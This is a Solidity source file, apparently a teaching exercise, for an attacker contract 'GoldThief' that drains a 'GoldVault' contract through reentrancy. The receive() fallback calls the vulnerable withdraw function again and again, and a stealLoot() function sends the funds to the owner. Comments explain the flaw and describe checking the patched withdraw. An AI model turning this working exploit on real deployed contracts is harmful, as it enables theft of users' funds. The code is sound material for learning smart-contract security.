//SPDX-License-Identifier:MIT
pragma solidity ^0.8.2;

// Reentrancy attack:
// A reentrancy attack is a class of security vulnerability in smart contracts where an external, untrusted contract is allowed to re-enter the caller contract during the execution of a state-changing operation, before the original state update is finalized, thereby enabling malicious manipulation of shared state.

// This contract would simulate an actual hack and then patch the vulnerability.

// Work flow:
// - This contract is built to **exploit the weakness** in `GoldVault`.
// - It’ll use a sneaky fallback function to **reenter the vault mid-withdrawal** — again and again.
// - You’ll get a front-row seat to the hack: how it works, how it drains the funds, and how fast it happens.
// - Then — we run the attack *after* we apply the fix... and **watch it fail**.


interface IVault{
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief{
    // This is the address of the vault we're targeting, wrapped in the IVault interface.
    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;// If it is true, we're testing "safeWithdraw()". If it is false, we're targeting "vulnerableWithdraw()".


// "_vaultAddress"is the address of goldtheif which is the address of vault we want to attack. This coule be any deployed contract that follows the "IVault" interface.
constructor(address _vaultAddress){
    targetVault=IVault(_vaultAddress);
    owner=msg.sender;
}

// This is the attack officially begins. The attacker calls this function to kick off a chain reaction that abuses the vulnerable vault logic.
function attackVulnerable() external payable{
    require(msg.sender==owner,"Only owner");
    require(msg.value>=1 ether,"Need at least 1 ETH to attack");

    attackingSafe=false;
    attackCount=0;

    targetVault.deposit{value:msg.value}();
    targetVault.vulnerableWithdraw();
}

function attackSafe() external payable{
    require(msg.sender==owner,"Only owner");
    require(msg.value>=1 ether,"Need at least 1 ETH");

    attackingSafe=true;
    attackCount=0;

    targetVault.deposit{value:msg.value}();
    targetVault.safeWithdraw();
}

// This function gets triggered every time we receive ETH.
receive() external payable{
    attackCount++;

    if(!attackingSafe&&address(targetVault).balance>=1 ether && attackCount<5){
        targetVault.vulnerableWithdraw();
    }

    if(attackingSafe){
        targetVault.safeWithdraw();
    }
}

function stealLoot() external{
    require(msg.sender==owner,"Only owner");
    payable(owner).transfer(address(this).balance);
}

function getBalance() external view returns(uint256){
    return address(this).balance;
}

}

